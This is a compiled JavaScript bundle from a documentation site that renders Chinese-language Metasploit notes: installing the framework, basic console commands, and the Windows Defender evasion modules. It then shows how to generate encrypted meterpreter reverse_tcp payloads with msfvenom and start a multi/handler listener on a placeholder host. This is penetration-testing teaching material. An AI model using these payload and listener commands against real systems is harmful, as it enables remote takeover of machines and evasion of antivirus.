(window.webpackJsonp=window.webpackJsonp||[]).push([[59],{410:function(e,a,t){"use strict";t.r(a);var s=t(1),n=Object(s.a)({},function(){var e=this,a=e.$createElement,t=e._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h2",{attrs:{id:"install"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#install","aria-hidden":"true"}},[e._v("#")]),e._v(" install")]),e._v(" "),t("div",{staticClass:"language-json extra-class"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[e._v("curl https"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("//raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\")]),e._v("\n  chmod "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("755")]),e._v(" msfinstall && \\\n  ./msfinstall\n# 注意"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v("https"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("//raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb")]),e._v("\n需要翻墙后黏贴下载安装代码即可.\n")])])]),t("h3",{attrs:{id:"exploit插件目录"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#exploit插件目录","aria-hidden":"true"}},[e._v("#")]),e._v(" exploit插件目录")]),e._v(" "),t("div",{staticClass:"language-json extra-class"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[e._v("#kali\n/usr/share/metasploit-framework/modules/exploit\n#ubuntu\n/opt/metasploit-framework/embedded/framework/modules/exploits\n\n")])])]),t("h3",{attrs:{id:"命令行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#命令行","aria-hidden":"true"}},[e._v("#")]),e._v(" 命令行")]),e._v(" "),t("ol",{attrs:{start:"0"}},[t("li",[e._v("基本命令行")])]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("查看所有可用的渗透攻击程序代码\nshow exploits\n查看所有可用的辅助攻击工具\nshow auxiliary\n查看该模块所有可用选项\nshow options\n查看该模块适用的所有载荷代码\nshow payloads\n查看该模块适用的攻击目标类型\nshow targets\n查看\b免杀模块（5.0新出特性）\nshow evasion\nevasion/windows/windows_defender_exe\nevasion/windows/windows_defender_js_hta\n\n")])])]),t("ol",[t("li",[e._v("generate命令单独生成payload")])]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("\nUsage: generate [options]\n\nGenerates a payload. Datastore options may be supplied after normal options.\n\nExample: generate -f python LHOST=127.0.0.1\n\nOPTIONS:\n\n    -E        Force encoding\n    -O <opt>  Deprecated: alias for the '-o' option\n    -P <opt>  Total desired payload size, auto-produce appropriate NOP sled length\n    -S <opt>  The new section name to use when generating (large) Windows binaries\n    -b <opt>  The list of characters to avoid example: '\\x00\\xff'\n    -e <opt>  The encoder to use\n    -f <opt>  Output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war\n    -h        Show this message\n    -i <opt>  The number of times to encode the payload\n    -k        Preserve the template behavior and inject the payload as a new thread\n    -n <opt>  Prepend a nopsled of [length] size on to the payload\n    -o <opt>  The output file name (otherwise stdout)\n    -p <opt>  The platform of the payload\n    -x <opt>  Specify a custom executable file to use as a template\n")])])]),t("div",{staticClass:"language-json extra-class"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[e._v("# show payloads查看自己想生成的payload\n# \b单独生成windows环境下反向连接的payload，\b\b执行后回连本地监听的主机lhost的端口lport\nuse windows/meterpreter/reverse_tcp\nset lhost "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("\nset lport "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4444")]),e._v("\ngenerate -\bf \bexe \n或\nmsfvenom -p windows/meterpreter/reverse_tcp lhost="),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v(" lport="),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("444")]),e._v(" --encrypt base"),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("64")]),e._v("\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST="),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("127.0")]),e._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("0.1")]),e._v(" --encrypt rc"),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),e._v(" --encrypt-key thisisakey -f c\n#添加了四种加密方式，分别为AES"),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("256")]),e._v("-CBC、RC"),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),e._v("、XOR和Base"),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("64")]),e._v("。\n")])])]),t("ol",[t("li",[e._v("监听本地端口")])]),e._v(" "),t("div",{staticClass:"language-json extra-class"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[e._v("use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost  "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("\nset lport  "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4444")]),e._v("\nset ExitOnSession "),t("span",{pre:!0,attrs:{class:"token boolean"}},[e._v("false")]),e._v("\nexploit -j\n或使用handler命令\nhandler -H "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("."),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v(" -P "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4444")]),e._v("  -p windows/meterpreter/reverse_tcp\n\n")])])]),t("ul",[t("li",[e._v("使用handler命令help")])]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Usage: handler [options]\n\nSpin up a Payload Handler as background job.\n\nOPTIONS:\n\n    -H <opt>  The RHOST/LHOST to configure the handler for\n    -P <opt>  The RPORT/LPORT to configure the handler for\n    -e <opt>  An Encoder to use for Payload Stage Encoding\n    -h        Help Banner\n    -n <opt>  The custom name to give the handler job\n    -p <opt>  The payload to configure the handler for\n    -x        Shut the Handler down after a session is established\n")])])]),t("h3",{attrs:{id:"参考资料："}},[t("a",{staticClass:"header-anchor",attrs:{href:"#参考资料：","aria-hidden":"true"}},[e._v("#")]),e._v(" 参考资料：")]),e._v(" "),t("ol",[t("li",[e._v("https://blog.rapid7.com/2019/01/10/metasploit-framework-5-0-released/")]),e._v(" "),t("li",[e._v("https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service")])])])},[],!1,null,null,null);a.default=n.exports}}]);